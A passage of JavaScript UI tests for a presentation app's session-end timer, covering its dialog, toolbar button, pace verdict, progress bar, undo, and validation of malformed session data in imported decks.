  { name: "SP5: invalid input keeps Set disabled and Enter inert; Enter sets a valid value", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest(null);
      await _sesUiPresent();
      await _sesUiOpenPresenter();
      _click("[data-testid='presenter-session-set']");
      await _waitFor(() => _$("[data-testid='session-dialog']"), 1500);
      const min = _$("[data-testid='session-minutes-input']");
      _sesUiSet(min, "0"); await _wait(60);
      if (!_$("[data-testid='session-set']").disabled) throw new Error("Set enabled for 0 minutes");
      _sesUiSet(min, "1441"); await _wait(60);
      if (!_$("[data-testid='session-set']").disabled) throw new Error("Set enabled for 1441 minutes");
      min.focus(); _key("Enter"); await _wait(150);
      if (!_$("[data-testid='session-dialog']") || hooks.getSessionForTest() !== null) throw new Error("Enter acted on invalid input");
      _sesUiSet(min, "45"); await _wait(60);
      if (_$("[data-testid='session-set']").disabled) throw new Error("Set disabled for 45 minutes");
      min.focus(); _key("Enter");
      await _waitFor(() => !_$("[data-testid='session-dialog']"), 1500);
      const s = hooks.getSessionForTest();
      if (!s || s.end - s.start !== 45 * 60000) throw new Error("Enter did not store 45 min: " + JSON.stringify(s));
    } finally { await _sesUiLeave(); }
  }},
  { name: "SP6: card opens the dialog with the stored times; Cancel keeps, Clear removes", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      const ses = { start: Date.now() - 10 * 60000, end: Date.now() + 50 * 60000 };
      hooks.setSessionForTest(ses);
      await _sesUiPresent();
      await _sesUiOpenPresenter();
      const cardBtn = await _waitFor(() => _$("[data-testid='presenter-session-panel'] button[aria-label*='Edit session end']"), 1500);
      _click(cardBtn);
      await _waitFor(() => _$("[data-testid='session-dialog']"), 1500);
      if (_$("[data-testid='session-start-input']").value !== fmtClock(ses.start) || _$("[data-testid='session-end-input']").value !== fmtClock(ses.end)) throw new Error("dialog does not show the stored times");
      _click("[data-testid='session-chip-90']"); await _wait(60);
      _click("[data-testid='session-cancel']");
      await _waitFor(() => !_$("[data-testid='session-dialog']"), 1500);
      _ssEq(hooks.getSessionForTest(), ses, "Cancel changed the session");
      _click(_$("[data-testid='presenter-session-panel'] button"));
      await _waitFor(() => _$("[data-testid='session-clear']"), 1500);
      _click("[data-testid='session-clear']");
      await _waitFor(() => hooks.getSessionForTest() === null, 1500).catch(() => { throw new Error("Clear did not remove the session"); });
      await _waitFor(() => _$("[data-testid='presenter-session-set']"), 1500);
    } finally { await _sesUiLeave(); }
  }},
  { name: "SP7: S and Escape of the presenter view are unchanged with a session", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest({ start: Date.now() - 60000, end: Date.now() + 30 * 60000 });
      await _sesUiPresent();
      await _sesUiOpenPresenter();
      _key("s");
      await _waitFor(() => !_$("[data-testid='presenter-view']"), 1500);
      await _sesUiOpenPresenter();
      _key("Escape");
      await _waitFor(() => !_$("[data-testid='presenter-view']"), 1500);
      await _wait(150);
      if (_$("header")) throw new Error("first Esc left Present");
    } finally { await _sesUiLeave(); }
  }},
]);

uiSuite("session-edge-bar", [
  { name: "EB1: live session -> bar shows, takes no clicks; T hides and shows; Shift+T / Ctrl+T do nothing", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest({ start: Date.now() - 10 * 60000, end: Date.now() + 20 * 60000 });
      await _sesUiPresent();
      const bar = await _waitFor(() => _$("[data-testid='present-session-bar']"), 2000);
      if (!_sesUiRoot().contains(bar)) throw new Error("bar is not inside the Present root");
      if (getComputedStyle(bar).pointerEvents !== "none") throw new Error("bar takes pointer events");
      if (bar.getBoundingClientRect().height > 6) throw new Error("bar is too tall");
      document.activeElement?.blur();
      _key("t");
      await _waitFor(() => !_$("[data-testid='present-session-bar']"), 1500).catch(() => { throw new Error("T did not hide the bar"); });
      _key("T", { shiftKey: true }); await _wait(120);
      _key("t", { ctrlKey: true }); await _wait(120);
      if (_$("[data-testid='present-session-bar']")) throw new Error("a modified T changed the bar");
      _key("t");
      await _waitFor(() => _$("[data-testid='present-session-bar']"), 1500).catch(() => { throw new Error("T did not show the bar"); });
    } finally { await _sesUiLeave(); }
  }},
  { name: "EB2: the hide choice is kept when Present is left and entered again", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest({ start: Date.now() - 10 * 60000, end: Date.now() + 20 * 60000 });
      await _sesUiPresent();
      await _waitFor(() => _$("[data-testid='present-session-bar']"), 2000);
      document.activeElement?.blur(); _key("t");
      await _waitFor(() => !_$("[data-testid='present-session-bar']"), 1500);
      await _exitFullscreen();
      await _sesUiPresent();
      await _wait(300);
      if (_$("[data-testid='present-session-bar']")) throw new Error("hide choice lost after re-entering Present");
      document.activeElement?.blur(); _key("t");
      await _waitFor(() => _$("[data-testid='present-session-bar']"), 1500);
    } finally { await _sesUiLeave(); }
  }},
  { name: "EB3: no bar over the presenter view, without a session, for an expired session, or in the editor", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest({ start: Date.now() - 10 * 60000, end: Date.now() + 20 * 60000 });
      await _sesUiPresent();
      await _waitFor(() => _$("[data-testid='present-session-bar']"), 2000);
      await _sesUiOpenPresenter();
      if (_$("[data-testid='present-session-bar']")) throw new Error("bar shown with the presenter view open");
      _key("s");
      await _waitFor(() => !_$("[data-testid='presenter-view']"), 1500);
      hooks.setSessionForTest(null);
      await _waitFor(() => !_$("[data-testid='present-session-bar']"), 1500).catch(() => { throw new Error("bar shown without a session"); });
      hooks.setSessionForTest({ start: Date.now() - 270 * 60000, end: Date.now() - 240 * 60000 });
      await _wait(1300);
      if (hooks.getSessionForTest() === null) throw new Error("stale session did not reach state");
      if (_$("[data-testid='present-session-bar']")) throw new Error("bar shown for an expired session");
      hooks.setSessionForTest({ start: Date.now() - 10 * 60000, end: Date.now() + 20 * 60000 });
      await _waitFor(() => _$("[data-testid='present-session-bar']"), 2000);
      await _exitFullscreen();
      await _wait(200);
      if (_$("[data-testid='present-session-bar']")) throw new Error("bar shown in the editor");
    } finally { await _sesUiLeave(); }
  }},
]);

// ── Session end: editor toolbar, dialog, live ingress, bar geometry (v13.80, P3)
const _sesTbBtn = () => _$("[data-testid='session-end-btn']");
// The icon-only button carries its state in data-live, title and aria-label.
// end = null: "Set session end"; end = a number: the live session end.
const _sesTbIs = (end) => {
  const b = _sesTbBtn();
  if (!b) return false;
  const tip = end == null ? "Set session end" : `Session ends ${fmtClock(end)} — click to change`;
  return b.dataset.live === (end == null ? "0" : "1") && b.title === tip && b.getAttribute("aria-label") === tip && b.textContent === "🕒";
};
const _sesTbDesc = () => { const b = _sesTbBtn(); return b ? `${b.dataset.live} | ${b.title} | ${b.textContent}` : "no button"; };
const _sesTbOpen = async () => {
  _click(_sesTbBtn());
  return _waitFor(() => _$("[data-testid='session-dialog']"), 1500);
};
// "M:SS" / "H:MM:SS" groups in a string -> seconds; non-numeric rest -> "#".
const _sesSecs = (t) => (String(t).match(/\d+(?::\d\d)+/g) || []).map((x) => x.split(":").reduce((a, b) => a * 60 + +b, 0));
const _sesShape = (t) => String(t).replace(/\d+(?::\d\d)+/g, "#");
const _sesRgb = (hex) => `rgb(${parseInt(hex.slice(1, 3), 16)}, ${parseInt(hex.slice(3, 5), 16)}, ${parseInt(hex.slice(5, 7), 16)})`;
// Import a deck through the real Import button path (hidden file input -> loadDeckFile).
const _sesImport = async (deck) => {
  const input = _$("input[type='file'][accept='.json,.vela']");
  if (!input) throw new Error("import file input missing");
  const dt = new DataTransfer();
  dt.items.add(new File([JSON.stringify(deck)], "session-test.vela", { type: "application/json" }));
  input.files = dt.files;
  input.dispatchEvent(new Event("change", { bubbles: true }));
};

uiSuite("session-editor-dialog", [
  { name: "SD1: End typed directly updates Minutes and the summary; Set stores { start, end }", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest(null);
      await _editorSetup();
      const t0 = Date.now();
      await _sesTbOpen();
      _sesUiSet(_$("[data-testid='session-start-input']"), "09:00");
      _sesUiSet(_$("[data-testid='session-end-input']"), "10:15");
      await _wait(80);
      if (_$("[data-testid='session-minutes-input']").value !== "75") throw new Error("minutes not 75: " + _$("[data-testid='session-minutes-input']").value);
      if (!/ends 10:15 \(75 min\)/.test(_$("[data-testid='session-summary']").textContent)) throw new Error("summary: " + _$("[data-testid='session-summary']").textContent);
      if (_$("[data-testid='session-set']").disabled) throw new Error("Set disabled for a valid End");
      _click("[data-testid='session-set']");
      await _waitFor(() => !_$("[data-testid='session-dialog']"), 1500);
      const t1 = Date.now(); // the dialog's `now` is in [t0, t1]: accept either side of a day roll
      const wants = [t0, t1].map((t) => JSON.stringify(resolveSessionTimes("09:00", "10:15", sessionDialogBase(null, t), t)));
      if (!wants.includes(JSON.stringify(hooks.getSessionForTest()))) throw new Error(`stored session ${JSON.stringify(hooks.getSessionForTest())}, want one of ${wants.join(" / ")}`);
    } finally { await _sesUiLeave(); }
  }},
  { name: "SD2: End equal to Start is the next day (24 h) and is accepted", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest(null);
      await _editorSetup();
      const d0 = new Date(Date.now());
      await _sesTbOpen();
      _sesUiSet(_$("[data-testid='session-start-input']"), "14:20");
      _sesUiSet(_$("[data-testid='session-end-input']"), "14:20");
      await _wait(80);
      // Same local-date arithmetic as the app: on a DST change day the wall-clock
      // 24 h is 23 h or 25 h; 25 h is over the 24 h cap, so Set stays disabled.
      const wallLen = new Date(d0.getFullYear(), d0.getMonth(), d0.getDate() + 1, 14, 20) - new Date(d0.getFullYear(), d0.getMonth(), d0.getDate(), 14, 20);
      if (wallLen > 86400000) {
        if (!_$("[data-testid='session-set']").disabled) throw new Error("Set enabled for a 25 h session (DST day)");
        return;
      }
      if (wallLen < 86400000) {
        if (_$("[data-testid='session-minutes-input']").value !== String(Math.round(wallLen / 60000))) throw new Error("minutes not 1380 on a DST day");
        return;
      }
      if (_$("[data-testid='session-minutes-input']").value !== "1440") throw new Error("minutes not 1440");
      if (_$("[data-testid='session-set']").disabled) throw new Error("Set disabled for a 24 h session");
      _click("[data-testid='session-set']");
      await _waitFor(() => !_$("[data-testid='session-dialog']"), 1500);
      const s = hooks.getSessionForTest();
      if (!s || s.end - s.start !== 86400000) throw new Error("stored session is not 24 h: " + JSON.stringify(s));
    } finally { await _sesUiLeave(); }
  }},
  { name: "SD3: Minutes 0 and 1441 disable Set; a valid value enables it again", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest(null);
      await _editorSetup();
      await _sesTbOpen();
      _click("[data-testid='session-chip-30']"); await _wait(60);
      if (_$("[data-testid='session-set']").disabled) throw new Error("Set disabled after chip 30");
      const mi = _$("[data-testid='session-minutes-input']");
      for (const v of ["0", "1441"]) {
        _sesUiSet(mi, v); await _wait(60);
        if (!_$("[data-testid='session-set']").disabled) throw new Error(`Set enabled with Minutes ${v}`);
        mi.focus(); _key("Enter"); await _wait(80);
        if (hooks.getSessionForTest() !== null) throw new Error(`Enter stored a session with Minutes ${v}`);
      }
      _sesUiSet(mi, "45"); await _wait(60);
      if (_$("[data-testid='session-set']").disabled) throw new Error("Set disabled with Minutes 45");
      _click("[data-testid='session-cancel']");
      await _waitFor(() => !_$("[data-testid='session-dialog']"), 1500);
      if (hooks.getSessionForTest() !== null) throw new Error("Cancel stored a session");
    } finally { await _sesUiLeave(); }
  }},
]);

// ── Session end: review fixes (v13.80) ────────────────────────────
const _sesSig = (hooks) => { const s = hooks.getDeckStateForTest(); return `${s.selectedId}#${s.slideIndex}`; };
const _sesWheel = (el, n = 3) => { for (let i = 0; i < n; i++) el.dispatchEvent(new WheelEvent("wheel", { deltaY: 300, bubbles: true, cancelable: true })); };
const _sesSwipe = (el) => {
  const a = new Touch({ identifier: 7, target: el, clientX: 400, clientY: 300 }), b = new Touch({ identifier: 7, target: el, clientX: 100, clientY: 300 });
  el.dispatchEvent(new TouchEvent("touchstart", { touches: [a], targetTouches: [a], changedTouches: [a], bubbles: true, cancelable: true }));
  el.dispatchEvent(new TouchEvent("touchend", { touches: [], targetTouches: [], changedTouches: [b], bubbles: true, cancelable: true }));
};

uiSuite("session-review-fixes", [
  { name: "SR1: wheel and swipe over the Present session dialog (chip and backdrop) do not change the slide or module", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest(null);
      await _sesUiPresent();
      await _sesUiOpenPresenter();
      _click("[data-testid='presenter-session-set']");
      await _waitFor(() => _$("[data-testid='session-dialog']"), 1500);
      const chip = _click("[data-testid='session-chip-30']");
      chip.focus(); await _wait(80);
      const back = chip.closest("[data-vela-modal]");
      if (!back) throw new Error("dialog backdrop has no data-vela-modal mark");
      const before = _sesSig(hooks);
      for (const [el, what] of [[chip, "chip"], [back, "backdrop"]]) {
        _sesWheel(el); await _wait(150);
        if (_sesSig(hooks) !== before) throw new Error(`wheel on the ${what} changed the slide: ${before} -> ${_sesSig(hooks)}`);
        _sesSwipe(el); await _wait(150);
        if (_sesSig(hooks) !== before) throw new Error(`swipe on the ${what} changed the slide: ${before} -> ${_sesSig(hooks)}`);
      }
      if (!_$("[data-testid='session-dialog']")) throw new Error("dialog closed");
    } finally { await _sesUiLeave(); }
  }},
  { name: "SR2: on-slide time counts only from the session start", fn: async () => {
    const S0 = _SS_T0, ses = { start: S0, end: S0 + 1800000 }, est = { est: [600, 600, 600] };
    const on = sessionOnSlideSec(S0, S0 - 600000, ses); // entered 10 min before the start
    _ssEq(on, 0, "on-slide sec at the start");
    _ssEq(computeSessionPace(est, 0, on, ses, S0).verdict, "on pace", "verdict at the start (deck fits exactly)");
    _ssEq(sessionOnSlideSec(S0 + 120000, S0 - 600000, ses), 120, "2 min after the start");
    _ssEq(sessionOnSlideSec(S0 + 120000, S0 + 60000, ses), 60, "entered after the start");
    _ssEq(sessionOnSlideSec(S0 - 60000, S0 - 600000, ses), 0, "before the start");
    _ssEq(sessionOnSlideSec(S0 + 1000, S0, null), 1, "no session: from entry");
    for (const bad of [NaN, Infinity, "x", undefined]) if (sessionOnSlideSec(bad, S0, ses) !== 0) throw new Error(`now ${String(bad)} not 0`);
    if (sessionOnSlideSec(S0 + 1000, NaN, ses) !== 1) throw new Error("NaN entry did not fall back to the start");
  }},
  { name: "SR3: dialog dates: a past session moves to the next day; a live session keeps its start date", fn: async () => {
    const at = (d, h, m) => new Date(2026, 5, d, h, m).getTime();
    let now = at(10, 23, 55);
    let r = resolveSessionTimes("00:05", "01:00", sessionDialogBase(null, now), now);
    _ssEq(r && [r.start - now, r.end], [600000, at(11, 1, 0)], "23:55: 00:05-01:00 starts in 10 min");
    now = at(10, 10, 30);
    r = resolveSessionTimes("09:00", "10:00", sessionDialogBase(null, now), now);
    _ssEq(r && [r.start, r.end], [at(11, 9, 0), at(11, 10, 0)], "10:30: 09:00-10:00 is tomorrow");
    now = at(10, 8, 0);
    r = resolveSessionTimes("09:00", "10:00", sessionDialogBase(null, now), now);
    _ssEq(r && [r.start, r.end], [at(10, 9, 0), at(10, 10, 0)], "08:00: normal case");
    let live = { start: at(9, 23, 30), end: at(10, 0, 30) };
    now = at(10, 0, 10);
    r = resolveSessionTimes("23:30", "00:45", sessionDialogBase(live, now), now);
    _ssEq(r && [r.start, r.end], [live.start, at(10, 0, 45)], "live 23:30-00:30, End 00:45 at 00:10");
    live = { start: at(9, 23, 0), end: at(10, 1, 0) };
    now = at(10, 0, 20);
    r = resolveSessionTimes("23:10", "01:00", sessionDialogBase(live, now), now);
    _ssEq(r && [r.start, r.end], [at(9, 23, 10), at(10, 1, 0)], "live 23:00-01:00, Start 23:10 at 00:20");
    // Over a DST change the next-day roll uses the local date (wall time kept).
    const d1 = new Date(at(10, 9, 0) + 86400000 * 3);
    _ssEq(new Date(resolveSessionTimes("09:00", "10:00", d1.getTime() + 7200000, d1.getTime() + 7200000).start).getHours(), 9, "rolled start keeps 09:00");
  }},
  { name: "SR4: a session in the past is set for tomorrow; the summary says starts in; the file note shows", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest(null);
      await _editorSetup();
      await _sesTbOpen();
      const note = _$("[data-testid='session-file-note']");
      if (!note || note.textContent !== "Saved in the deck file (also in exports of the deck).") throw new Error("file note missing: " + note?.textContent);
      if (parseFloat(getComputedStyle(note).fontSize) < 13) throw new Error("file note below 13 px");
      const t = Date.now();
      _sesUiSet(_$("[data-testid='session-start-input']"), fmtClock(t - 7200000));
      _sesUiSet(_$("[data-testid='session-end-input']"), fmtClock(t - 3600000));
      await _wait(80);
      const txt = _$("[data-testid='session-summary']").textContent;
      if (!/starts in \d/.test(txt)) throw new Error("summary does not say starts in: " + txt);
      _click("[data-testid='session-set']");
      await _waitFor(() => !_$("[data-testid='session-dialog']"), 1500);
      const s = hooks.getSessionForTest();
      if (!s || !(s.start > Date.now()) || !liveSession(s, Date.now())) throw new Error("stored session is not a future live session: " + JSON.stringify(s));
    } finally { await _sesUiLeave(); }
  }},
  { name: "SR5: wheel inside the Presenter View right column scrolls it and does not change the slide", fn: async () => {
    const hooks = _sesUiNeedHooks();
    let col = null;
    try {
      hooks.setSessionForTest({ start: Date.now() - 600000, end: Date.now() + 1200000 });
      await _sesUiPresent();
      await _sesUiOpenPresenter();
      const panel = _$("[data-testid='presenter-session-panel']");
      col = panel.parentElement;
      while (col && getComputedStyle(col).overflowY !== "auto") col = col.parentElement;
      if (!col) throw new Error("right column not found");
      col.style.maxHeight = "120px"; await _wait(80); // a short viewport: the column overflows
      if (!(col.scrollHeight > col.clientHeight + 1)) throw new Error("right column does not overflow");
      const before = _sesSig(hooks);
      _sesWheel(panel); await _wait(200);
      if (_sesSig(hooks) !== before) throw new Error(`wheel in the right column changed the slide: ${before} -> ${_sesSig(hooks)}`);
    } finally { if (col) col.style.maxHeight = ""; await _sesUiLeave(); }
  }},
]);

uiSuite("session-panel-verdict", [
  { name: "SV1: in-progress verdict (ahead, on pace, behind) equals computeSessionPace for the same deck and slide", fn: async () => {
    const hooks = _sesUiNeedHooks();
    if (!VELA_TEST_STARTUP_PATCH) throw new Error("startup deck fixture missing");
    const lanes = validateAndSanitizeDeck(JSON.parse(JSON.stringify(VELA_TEST_STARTUP_PATCH)), { keepIds: true }).lanes;
    try {
      hooks.setSessionForTest(null);
      await _sesUiPresent();
      await _sesUiOpenPresenter();
      const seq = presentSequence(lanes, hooks.getDeckStateForTest().selectedId);
      const est = sessionEstimates(seq);
      const youNum = () => { const m = /YOU · slide (\d+)/.exec(_$("[data-testid='presenter-session-panel']")?.textContent || ""); return m ? +m[1] : null; };
      const check = async (label, endInSec, want) => {
        const ses = { start: Date.now() - 60000, end: Date.now() + endInSec * 1000 };
        hooks.setSessionForTest(ses);
        const pv = await _waitFor(() => _$("[data-testid='presenter-pace']"), 2000);
        await _wait(80);
        const n = youNum();
        const idx = seq.findIndex((e) => e.num === n);
        if (idx < 0) throw new Error(`${label}: YOU slide ${n} not in the sequence`);
        const exp = computeSessionPace(est, idx, 0, ses, Date.now());
        const got = pv.textContent;
        if (_sesShape(got) !== _sesShape(exp.verdict)) throw new Error(`${label}: verdict "${got}" vs "${exp.verdict}"`);
        const a = _sesSecs(got), b = _sesSecs(exp.verdict);
        if (a.length !== b.length || a.some((x, k) => Math.abs(x - b[k]) > 10)) throw new Error(`${label}: numbers "${got}" vs "${exp.verdict}"`);
        if (getComputedStyle(pv).color !== _sesRgb(SESSION_PACE_COLORS[exp.paceKey])) throw new Error(`${label}: colour ${getComputedStyle(pv).color} vs ${exp.paceKey}`);
        if (want && !want.test(got)) throw new Error(`${label}: unexpected verdict "${got}"`);
        const gap = _$("[data-testid='presenter-pace-gap']");
        if (!gap || getComputedStyle(gap).backgroundColor !== _sesRgb(SESSION_PACE_COLORS[exp.paceKey])) throw new Error(`${label}: pace gap colour`);
        if (gap.getBoundingClientRect().width < 5.5) throw new Error(`${label}: pace gap narrower than 6 px`);
        return exp;
      };
      const n0 = await (async () => { hooks.setSessionForTest({ start: Date.now() - 60000, end: Date.now() + 3600000 }); await _waitFor(() => youNum() !== null, 2000); return youNum(); })();
      const i0 = seq.findIndex((e) => e.num === n0);
      const need0 = computeSessionPace(est, i0, 0, { start: Date.now() - 60000, end: Date.now() + 3600000 }, Date.now()).need;
      await check("ahead", Math.round(need0) + 900, /ahead · you can slow down$/);
      await check("on pace", Math.round(need0), /^on pace$/);
      await check("behind", Math.max(61, Math.round(need0) - 600), /behind · speed up$/);
    } finally { await _sesUiLeave(); }
  }},
]);

uiSuite("session-ingress-live", [
  { name: "SL1: Import of a deck with a valid session sets it; hostile sessions load as null; a deck without one clears it", fn: async () => {
    const hooks = _sesUiNeedHooks();
    if (!VELA_TEST_STARTUP_PATCH || !hooks.restoreStartupDeck) throw new Error("startup deck fixture missing");
    const deck = (session) => { const d = JSON.parse(JSON.stringify(VELA_TEST_STARTUP_PATCH)); delete d.session; if (session !== undefined) d.session = session; return d; };
    const t0 = Date.now() - 60000;
    const valid = { start: t0, end: t0 + 1800000 };
    const hostile = [
      { start: String(t0), end: t0 + 1800000 },
      { start: t0, end: String(t0 + 1800000) },
      { start: t0 + 0.5, end: t0 + 1800000 },
      { start: t0 + 1800000, end: t0 },
      { start: t0, end: t0 + 30 * 86400000 },
      [t0, t0 + 1800000],
      "x",
    ];
    try {
      await _editorSetup();
      for (const h of hostile) {
        await _sesImport(deck(valid));
        await _waitFor(() => JSON.stringify(hooks.getSessionForTest()) === JSON.stringify(valid), 2000).catch(() => { throw new Error("valid session not loaded by Import"); });
        await _sesImport(deck(h));
        await _waitFor(() => hooks.getSessionForTest() === null, 2000).catch(() => { throw new Error("hostile session kept by Import: " + JSON.stringify(h)); });
      }
      await _sesImport(deck(valid));
      await _waitFor(() => hooks.getSessionForTest() !== null, 2000);
      await _sesImport(deck(undefined));
      await _waitFor(() => hooks.getSessionForTest() === null, 2000).catch(() => { throw new Error("deck without session kept the previous session"); });
    } finally { hooks.restoreStartupDeck(); hooks.setSessionForTest?.(null); await _wait(150); }
  }},
]);

uiSuite("session-toolbar", [
  { name: "ST1: icon only; state in title/aria-label: not set without a session, ends HH:MM when live, not set when stale; timer flips it at end + 3 h", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest(null);
      await _editorSetup();
      const btn = await _waitFor(() => _sesTbBtn(), 1500);
      if (btn.tagName !== "BUTTON" || !btn.getAttribute("aria-label") || !btn.title) throw new Error("session-end-btn is not a labelled button");
      const present = _$("[data-testid='present-btn']");
      if (btn.nextElementSibling !== present) throw new Error("session-end-btn is not immediately before present-btn");
      if (!_sesTbIs(null)) throw new Error("no-session state: " + _sesTbDesc());
      const live = { start: Date.now() - 60000, end: Date.now() + 1800000 };
      hooks.setSessionForTest(live);
      await _waitFor(() => _sesTbIs(live.end), 1500).catch(() => { throw new Error("live state: " + _sesTbDesc()); });
      const stale = { start: Date.now() - SESSION_STALE_MS - 1000 - 1800000, end: Date.now() - SESSION_STALE_MS - 1000 };
      hooks.setSessionForTest(stale);
      await _waitFor(() => _sesTbIs(null), 1500).catch(() => { throw new Error("stale state: " + _sesTbDesc()); });
      if (hooks.getSessionForTest() === null) throw new Error("stale session not kept in state");
      const soon = { start: Date.now() - SESSION_STALE_MS - 1800000 + 1500, end: Date.now() - SESSION_STALE_MS + 1500 };
      hooks.setSessionForTest(soon);
      await _waitFor(() => _sesTbIs(soon.end), 1500).catch(() => { throw new Error("nearly stale state: " + _sesTbDesc()); });
      await _waitFor(() => _sesTbIs(null), 5000).catch(() => { throw new Error("state did not go back to not set at end + 3 h: " + _sesTbDesc()); });
    } finally { await _sesUiLeave(); }
  }},
  { name: "ST2: click opens one dialog; ArrowRight / Delete / f do nothing while it is open", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest(null);
      await _editorSetup();
      const before = JSON.stringify([hooks.getDeckStateForTest().selectedId, hooks.getDeckStateForTest().slideIndex, hooks.getHistoryCounts().past]);
      await _sesTbOpen();
      if (_$$("[data-testid='session-dialog']").length !== 1) throw new Error("more than one session dialog");
      _$("[data-testid='session-chip-15']").focus();
      for (const k of ["ArrowRight", "Delete", "f"]) { _key(k); await _wait(80); }
      document.activeElement?.blur();
      for (const k of ["ArrowRight", "Delete", "f"]) { _key(k); await _wait(80); }
      await _wait(150);
      if (!_$("[data-testid='session-dialog']")) throw new Error("a key closed the dialog");
      if (!_$("header") || hooks.getDeckStateForTest().fullscreen) throw new Error("f entered Present");
      const after = JSON.stringify([hooks.getDeckStateForTest().selectedId, hooks.getDeckStateForTest().slideIndex, hooks.getHistoryCounts().past]);
      if (after !== before) throw new Error(`editor state changed: ${before} -> ${after}`);
      _click("[data-testid='session-cancel']");
      await _waitFor(() => !_$("[data-testid='session-dialog']"), 1500);
    } finally { await _sesUiLeave(); }
  }},
  { name: "ST3: Set and Clear from the editor dialog; Ctrl+Z restores the previous session value", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest(null);
      await _editorSetup();
      await _wait(100);
      await _sesTbOpen();
      _click("[data-testid='session-chip-30']"); await _wait(60);
      _click("[data-testid='session-set']");
      await _waitFor(() => !_$("[data-testid='session-dialog']"), 1500);
      const s1 = hooks.getSessionForTest();
      if (!s1 || s1.end - s1.start !== 1800000) throw new Error("Set did not store 30 min: " + JSON.stringify(s1));
      await _waitFor(() => _sesTbIs(s1.end), 1500);
      document.activeElement?.blur(); await _wait(80);
      _key("z", { ctrlKey: true });
      await _waitFor(() => hooks.getSessionForTest() === null, 1500).catch(() => { throw new Error("undo did not restore the empty session"); });
      await _waitFor(() => _sesTbIs(null), 1500);
      hooks.setSessionForTest(s1);
      await _waitFor(() => hooks.getSessionForTest() !== null, 1500);
      await _sesTbOpen();
      _click("[data-testid='session-clear']");
      await _waitFor(() => hooks.getSessionForTest() === null && !_$("[data-testid='session-dialog']"), 1500).catch(() => { throw new Error("Clear did not remove the session"); });
      document.activeElement?.blur(); await _wait(80);
      _key("z", { ctrlKey: true });
      await _waitFor(() => JSON.stringify(hooks.getSessionForTest()) === JSON.stringify(s1), 1500).catch(() => { throw new Error("undo did not restore the cleared session"); });
    } finally { await _sesUiLeave(); }
  }},
  { name: "ST4: button at every desktop header width (1024-1440 px); the top bar stays on one line", fn: async () => {
    // Forcing the header width stands in for a window resize (as meridian-CR13).
    await _editorSetup();
    const h = await _waitFor(() => _$("header"), 2000);
    const frames = () => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)));
    const prev = h.style.width;
    const bad = [];
    try {
      for (const w of [1024, 1100, 1280, 1440, 1100, 1024]) {
        h.style.width = `${w}px`;
        for (let f = 0; f < 3; f++) await frames();
        const btns = _$$("button", h).filter((b) => b.offsetParent && !b.closest("[role='group']"));
        const minH = Math.min(...btns.map((b) => b.offsetHeight));
        const wrapped = btns.filter((b) => b.offsetHeight > minH + 8).map((b) => b.title || b.textContent.trim());
        const sb = _sesTbBtn();
        if (!sb || !sb.offsetParent || sb.getBoundingClientRect().width < 1) bad.push(`${w}px: button absent`);
        if (h.scrollWidth > h.clientWidth + 1) bad.push(`${w}px: overflow ${h.scrollWidth}>${h.clientWidth}`);
        if (wrapped.length) bad.push(`${w}px: wrapped ${wrapped.join(", ")}`);
      }
    } finally {
      h.style.width = prev;
      await frames();
    }
    if (bad.length) throw new Error(bad.slice(0, 4).join(" | "));
  }},
]);

uiSuite("session-bar-geometry", [
  { name: "SG1: sessionBarGeom table", fn: async () => {
    const g = (p) => { const r = sessionBarGeom(p); return r && [r.over, r.key, r.lo, r.hi, r.gap, r.you, r.should]; };
    _ssEq(g({ youFrac: 0.6, shouldFrac: 0.25, paceKey: "green" }), [false, "green", 25, 60, 35, 60, 25], "ahead");
    _ssEq(g({ youFrac: 0.2, shouldFrac: 0.5, paceKey: "amber" }), [false, "amber", 20, 50, 30, 20, 50], "behind amber");
    _ssEq(g({ youFrac: 0.1, shouldFrac: 0.7, paceKey: "red" }), [false, "red", 10, 70, 60, 10, 70], "behind red");
    _ssEq(g({ youFrac: 0.4, shouldFrac: 0.4, paceKey: "white" }), [false, "white", 40, 40, 0, 40, 40], "on pace");
    _ssEq(g({ youFrac: 0.3, shouldFrac: 1, paceKey: "red", over: true }), [true, "red", 0, 100, 100, 30, 100], "over");
    _ssEq(g({ youFrac: 0, shouldFrac: 0, paceKey: "green", before: true }), [false, "green", 0, 0, 0, 0, 0], "before start / both 0");
    _ssEq(g({ youFrac: 1, shouldFrac: 1, paceKey: "white" }), [false, "white", 100, 100, 0, 100, 100], "both 1");
    _ssEq(g({ youFrac: 0.123456, shouldFrac: 0.5, paceKey: "amber" }), [false, "amber", 12.35, 50, 37.65, 12.35, 50], "rounding");
    _ssEq(g({ youFrac: NaN, shouldFrac: Infinity, paceKey: "url(x)" }), [false, "white", 0, 0, 0, 0, 0], "non-finite input, unknown key");
    _ssEq(g({ youFrac: -2, shouldFrac: 7, paceKey: "__proto__" }), [false, "white", 0, 100, 100, 0, 100], "clamped, inherited key");
    if (sessionBarGeom(null) !== null || sessionBarGeom("x") !== null) throw new Error("non-object pace must give null");
    const live = computeSessionPace({ est: [60, 60, 60] }, 0, 0, { start: _SS_T0, end: _SS_T0 + 300000 }, _SS_T0 + 1000);
    const lg = sessionBarGeom(live);
    if (lg.key !== live.paceKey || lg.you !== Math.round(live.youFrac * 10000) / 100) throw new Error("geometry does not follow computeSessionPace");
  }},
]);

// ━━━ UI TEST RUNNER COMPONENT ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// Demo deck guard — UI tests only run against the original demo deck
// to avoid mutating user work. Reads live deck title from DOM header.

function computeDeckFingerprint() {
  try {
    // Read LIVE deck title from header (reflects current state, not embedded data)
